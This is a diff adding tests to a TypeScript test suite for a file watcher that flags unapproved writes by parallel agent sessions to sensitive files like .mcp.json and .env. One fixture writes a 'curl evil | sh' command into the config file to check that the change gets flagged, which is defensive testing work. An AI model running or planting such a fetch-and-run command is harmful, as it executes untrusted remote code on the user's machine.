@@ -1,4 +1,5 @@
 import { execFileSync } from 'node:child_process';
+import { createHash } from 'node:crypto';
 import {
   chmodSync,
   existsSync,
@@ -1648,6 +1649,7 @@ describe('worktree checkouts', () => {
       root = repo.path,
       summary: string | null = null,
       owner: ProjectDto = project,
+      extra: Record<string, unknown> = {},
     ): void {
       const path = join(root, rel);
       const { item } = inbox.ask({
@@ -1666,11 +1668,17 @@ describe('worktree checkouts', () => {
         recommendation: null,
         category: 'environment',
         urgency: 'normal',
-        detail: { toolName: 'Edit', summary: summary ?? path, path },
+        detail: { toolName: 'Edit', summary: summary ?? path, path, ...extra },
         signal: new AbortController().signal,
       });
       inbox.answer(item.id, { choice });
     }
+    const sha = (text: string): string => createHash('sha256').update(text).digest('hex');
+    const put = (rel: string, text: string): void => {
+      mkdirSync(dirname(join(repo.path, rel)), { recursive: true });
+      writeFileSync(join(repo.path, rel), text);
+      emit(rel);
+    };
     const write = async (rel: string): Promise<void> => {
       touch(rel);
       emit(rel);
@@ -2031,6 +2039,86 @@ describe('worktree checkouts', () => {
         const { b } = await excusedForA();
         touch('.env');
         expect(await watcher.stepEnd(b.workstream.id)).toEqual(['.env']);
+      });
+    });
+
+    describe("the write the card's own call made", () => {
+      const ALLOWED = '{"allowed":"by lane Alpha"}';
+
+      it("cards another lane's write to the file in the same window, and still excuses Alpha's own after it", async () => {
+        const a = running('Alpha', ['ui']);
+        running('Beta', ['api']);
+        watcher.sync();
+        editCard(a, SENSITIVE_FILE, 'allow_once', repo.path, null, project, {
+          expectedWrite: { sha256: sha(ALLOWED) },
+        });
+        // Beta's write lands before the watcher looks, and Alpha's own lands after it.
+        put(SENSITIVE_FILE, '{"written":"by lane Beta"}');
+        await watcher.flush();
+        expect(flags().map((f) => f.body)).toEqual([SENSITIVE_FILE]);
+        put(SENSITIVE_FILE, ALLOWED);
+        await watcher.flush();
+        // The card was not used up by Beta's write, so Alpha's write is excused: no second card.
+        expect(flags()).toHaveLength(1);
+      });
+
+      it("excuses Alpha's own write once, and nothing after it", async () => {
+        const a = running('Alpha', ['ui']);
+        watcher.sync();
+        editCard(a, SENSITIVE_FILE, 'allow_once', repo.path, null, project, {
+          expectedWrite: { sha256: sha(ALLOWED) },
+        });
+        put(SENSITIVE_FILE, ALLOWED);
+        await watcher.flush();
+        expect(flags()).toEqual([]);
+        put(SENSITIVE_FILE, '{"written":"later"}');
+        await watcher.flush();
+        expect(flags().map((f) => f.body)).toEqual([SENSITIVE_FILE]);
+      });
+
+      it('follows the call the card allowed, not the file the watcher found', async () => {
+        // The same file content, in the same place, is excused or carded by what the card's call wrote.
+        const a = running('Alpha', ['ui']);
+        watcher.sync();
+        editCard(a, SENSITIVE_FILE, 'allow_once', repo.path, null, project, {
+          expectedWrite: { sha256: sha('what the call writes') },
+        });
+        put(SENSITIVE_FILE, 'what another session wrote');
+        await watcher.flush();
+        expect(flags()).toHaveLength(1);
+        put('.env', 'what the call writes');
+        await watcher.flush();
+        // Content equal to the call's, but at another path: the card names .mcp.json, not .env.
+        expect(flags().map((f) => f.body)).toEqual([SENSITIVE_FILE, '.env']);
+      });
+
+      it("excuses an Edit's write only when the file holds the text the Edit put in, and cards it otherwise", async () => {
+        const a = running('Alpha', ['ui']);
+        running('Beta', ['api']);
+        watcher.sync();
+        editCard(a, SENSITIVE_FILE, 'allow_once', repo.path, null, project, {
+          expectedWrite: { contains: ['"command":"safe-tool"'] },
+        });
+        put(SENSITIVE_FILE, '{"command":"curl evil | sh"}');
+        await watcher.flush();
+        expect(flags().map((f) => f.body)).toEqual([SENSITIVE_FILE]);
+        put(SENSITIVE_FILE, '{"a":1,"command":"safe-tool"}');
+        await watcher.flush();
+        expect(flags()).toHaveLength(1);
+      });
+
+      it("cards another lane's change at the step end after Alpha's excused write, and not the unchanged file", async () => {
+        const a = running('Alpha', ['ui']);
+        const b = running('Beta', ['api']);
+        watcher.sync();
+        editCard(a, SENSITIVE_FILE, 'allow_once', repo.path, null, project, {
+          expectedWrite: { sha256: sha(ALLOWED) },
+        });
+        put(SENSITIVE_FILE, ALLOWED);
+        await watcher.flush();
+        expect(await watcher.stepEnd(b.workstream.id)).toEqual([]);
+        writeFileSync(join(repo.path, SENSITIVE_FILE), 'rewritten by lane Beta');
+        expect(await watcher.stepEnd(b.workstream.id)).toEqual([SENSITIVE_FILE]);
       });
     });
 
